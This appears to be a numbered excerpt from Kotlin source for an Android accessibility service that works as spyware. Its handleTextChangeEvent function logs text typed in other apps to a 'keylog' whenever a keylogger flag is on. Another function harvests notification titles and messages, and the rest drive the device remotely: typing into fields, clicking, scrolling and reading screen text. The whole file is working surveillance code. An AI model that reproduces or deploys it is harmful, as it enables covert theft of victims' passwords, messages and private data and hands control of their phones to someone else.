   176→    private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
   177→        if (!keyloggerEnabled.get()) return
   178→
   179→        textEventCount++
   180→        
   181→        try {
   182→            // Get the text from the event
   183→            val text = event.text?.joinToString("") ?: ""
   184→            val fromIndex = event.fromIndex
   185→            val addedCount = event.addedCount
   186→            val removedCount = event.removedCount
   187→            val beforeText = event.beforeText?.toString() ?: ""
   188→            
   189→            // Get the source node for more details
   190→            val source = event.source
   191→            val viewId = source?.viewIdResourceName ?: ""
   192→            val className = source?.className?.toString() ?: ""
   193→            val description = source?.contentDescription?.toString() ?: ""
   194→            
   195→            // Build the captured data
   196→            val capturedText = buildString {
   197→                if (text.isNotEmpty()) {
   198→                    append(text)
   199→                }
   200→                if (beforeText.isNotEmpty() && text.isNotEmpty() && beforeText != text) {
   201→                    // Text was modified
   202→                    append("[EDIT]")
   203→                }
   204→            }
   205→            
   206→            if (capturedText.isNotEmpty()) {
   207→                // Update last captured
   208→                lastCapturedText.append(capturedText)
   209→                if (lastCapturedText.length > 10000) {
   210→                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(5000))
   211→                }
   212→                
   213→                // Send to MonitorExecutor
   214→                MonitorExecutor.appendKeylog(
   215→                    packageName = packageName,
   216→                    text = capturedText,
   217→                    viewType = "text_change"
   218→                )
   219→                
   220→                // Also log with context
   221→                logKeyEvent(
   222→                    packageName = packageName,
   223→                    text = capturedText,
   224→                    viewId = viewId,
   225→                    className = className
   226→                )
   227→            }
   228→            
   229→            source?.recycle()
   230→        } catch (e: Exception) {
   231→            // Log error but don't crash
   232→        }
   233→    }

   277→    private fun handleNotificationEvent(event: AccessibilityEvent, packageName: String) {
   278→        notificationEventCount++
   279→        
   280→        if (!notificationInterceptEnabled.get() && !keyloggerEnabled.get()) return
   281→

   283→            val text = event.text?.joinToString("\n") ?: ""
   284→            val tickerText = event.text?.joinToString() ?: ""
   285→

   287→            val parcelableData = event.parcelableData
   288→            
   289→            var title = ""
   290→            var message = ""
   291→            var category = ""
   292→            
   293→            if (parcelableData is Notification) {
   294→                val notification = parcelableData
   295→                title = notification.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
   296→                message = notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
   297→                category = notification.category ?: ""
   298→                
   299→                // Add to notification history
   300→                MonitorExecutor.addNotification(packageName, title, message, category)
   301→            }
   302→            
   303→            // Log notification if keylogger is active
   304→            if (keyloggerEnabled.get()) {
   305→                val notifText = buildString {
   306→                    if (title.isNotEmpty()) append("[$title] ")
   307→                    if (message.isNotEmpty()) append(message)
   308→                    if (text.isNotEmpty() && text != message) append(" | $text")
   309→                }
   310→                
   311→                if (notifText.isNotEmpty()) {
   312→                    MonitorExecutor.appendKeylog(
   313→                        packageName = packageName,
   314→                        text = "[NOTIF:$notifText]",
   315→                        viewType = "notification"
   316→                    )
   317→                }
   318→            }
   319→        } catch (_: Exception) {}
   320→    }

   384→        val root = rootInActiveWindow ?: return false

   398→        // No explicit recycling needed for findAccessibilityNodeInfosByText

   448→                gestureResult = false
   449→                gestureLatch?.countDown()

   451→        }, null)
   452→        
   453→        if (dispatched) {
   454→            gestureLatch?.await(2, TimeUnit.SECONDS)
   455→        }

   499→    /**
   500→     * Type text into a focused input field
   501→     */
   502→    fun typeText(text: String): Boolean {
   503→        val root = rootInActiveWindow ?: return false
   504→        
   505→        // Find focused node or editable node
   506→        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
   507→            ?: root.findAccessibilityNodeInfosByViewId("android:id/edit").firstOrNull()
   508→            ?: run {
   509→                val nodes = root.findAccessibilityNodeInfosByText("")
   510→                nodes.firstOrNull { it.isEditable }
   511→            }
   512→        
   513→        if (focusedNode == null) return false
   514→        
   515→        // Try to set text directly
   516→        val arguments = Bundle()
   517→        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
   518→        val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
   519→        
   520→        focusedNode.recycle()
   521→        return result
   522→    }

   524→    /**
   525→     * Scroll in a direction
   526→     */
   527→    fun scroll(direction: ScrollDirection): Boolean {
   528→        val root = rootInActiveWindow ?: return false
   529→        
   530→        val action = when (direction) {
   531→            ScrollDirection.UP -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   532→            ScrollDirection.DOWN -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   533→            ScrollDirection.LEFT -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   534→            ScrollDirection.RIGHT -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   535→        }
   536→        
   537→        // Find scrollable node
   538→        val scrollableNode = findScrollableNode(root, direction) ?: return false
   539→        val result = scrollableNode.performAction(action)
   540→        scrollableNode.recycle()
   541→        
   542→        return result
   543→    }
   544→    
   545→    private fun findScrollableNode(node: AccessibilityNodeInfo, direction: ScrollDirection): AccessibilityNodeInfo? {
   546→        if (node.isScrollable) return node
   547→        
   548→        for (i in 0 until node.childCount) {
   549→            val child = node.getChild(i) ?: continue
   550→            val result = findScrollableNode(child, direction)
   551→            if (result != null) return result
   552→            child.recycle()
   553→        }
   554→        
   555→        return null
   556→    }

   570→    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
   571→        val text = node.text?.toString()
   572→        if (!text.isNullOrBlank()) {
   573→            builder.append(text).append("\n")
   574→        }
   575→        
   576→        val contentDesc = node.contentDescription?.toString()
   577→        if (!contentDesc.isNullOrBlank() && contentDesc != text) {
   578→            builder.append(contentDesc).append("\n")
   579→        }
   580→        
   581→        for (i in 0 until node.childCount) {
   582→            val child = node.getChild(i) ?: continue
   583→            extractTextFromNode(child, builder)
   584→            child.recycle()
   585→        }
   586→    }

   631→    private fun performClickOnNode(node: AccessibilityNodeInfo): Boolean {
   632→        // Try direct click
   633→        if (node.isClickable) {
   634→            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   635→        }
   636→        
   637→        // Try parent click
   638→        var parent = node.parent
   639→        while (parent != null) {
   640→            if (parent.isClickable) {
   641→                val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   642→                parent.recycle()
   643→                return clicked
   644→            }
   645→            val grandParent = parent.parent
   646→            parent.recycle()
   647→            parent = grandParent
   648→        }
   649→        
   650→        // Try click via coordinates
   651→        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
   652→            val bounds = Rect()
   653→            node.getBoundsInScreen(bounds)
   654→            return clickAt(bounds.centerX(), bounds.centerY())
   655→        }
   656→        
   657→        return false
   658→    }
